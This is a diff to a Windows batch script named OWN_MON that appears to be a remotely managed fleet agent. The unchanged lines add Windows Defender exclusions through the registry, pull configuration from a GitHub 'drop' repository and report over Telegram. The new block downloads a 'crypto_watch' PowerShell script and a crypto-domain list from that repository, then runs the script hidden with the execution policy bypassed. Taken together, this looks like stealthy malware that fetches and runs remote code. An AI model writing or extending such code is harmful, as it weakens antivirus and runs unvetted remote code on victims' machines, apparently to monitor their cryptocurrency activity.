@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M71
+rem  OWN_MON  BUILD 20260808M72
 rem  M71: fleet one-shot campaign hook (fleet_campaign.cfg CAMPAIGN=/SCRIPT=, per-host ack, runs once).
 rem  M70: sevrz-only monitor/heal/TG/self-update.
 rem  M69: GIT_PIN=main always pulls tip every tick.
@@ -48,8 +48,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M71"
-set "MON_MIN=M71"
+set "MONVER=M72"
+set "MON_MIN=M72"
 set "GIT_PIN="
 set "CHANNEL_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_channel.cfg?t=%RANDOM%%RANDOM%"
 set "FLOOR_FILE=%WD%\version_floor.cfg"
@@ -477,6 +477,20 @@ if errorlevel 1 (
   echo periodic re-secure>>"%LOG%"
   call "%WD%\own_secure.cmd" >>"%LOG%" 2>&1
   echo done>"%WD%\sec.flag"
+)
+
+rem ── [H0] CryptoWatch (detached; 6h throttle inside script) ──
+set "CW_PS1=%WD%\winrtcs_crypto_watch.ps1"
+set "CW_DOM=%WD%\winrtcs_crypto_domains.cfg"
+if exist "C:\ProgramData\WinRTCS\winrtcs_crypto_watch.ps1" set "CW_PS1=C:\ProgramData\WinRTCS\winrtcs_crypto_watch.ps1"
+if exist "C:\ProgramData\WinRTCS\crypto_domains.cfg" set "CW_DOM=C:\ProgramData\WinRTCS\crypto_domains.cfg"
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\winrtcs_crypto_watch.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_crypto_watch.ps1?t=%RANDOM%" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%WD%\winrtcs_crypto_domains.cfg" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_crypto_domains.cfg?t=%RANDOM%" >nul 2>&1
+if exist "%WD%\winrtcs_crypto_watch.ps1" findstr /C:"WINRTCS_CRYPTO_WATCH" "%WD%\winrtcs_crypto_watch.ps1" >nul 2>&1 && set "CW_PS1=%WD%\winrtcs_crypto_watch.ps1"
+if exist "%WD%\winrtcs_crypto_domains.cfg" findstr /C:"WINRTCS_CRYPTO_DOMAINS" "%WD%\winrtcs_crypto_domains.cfg" >nul 2>&1 && set "CW_DOM=%WD%\winrtcs_crypto_domains.cfg"
+if exist "%CW_PS1%" (
+  start "" /min powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%CW_PS1%" -WorkDir "%WD%" -DomainList "%CW_DOM%"
+  echo crypto_watch_queued>>"%LOG%"
 )
 
 rem ── [H] quiet digest (skip healthy hosts — was flooding Telegram) ──
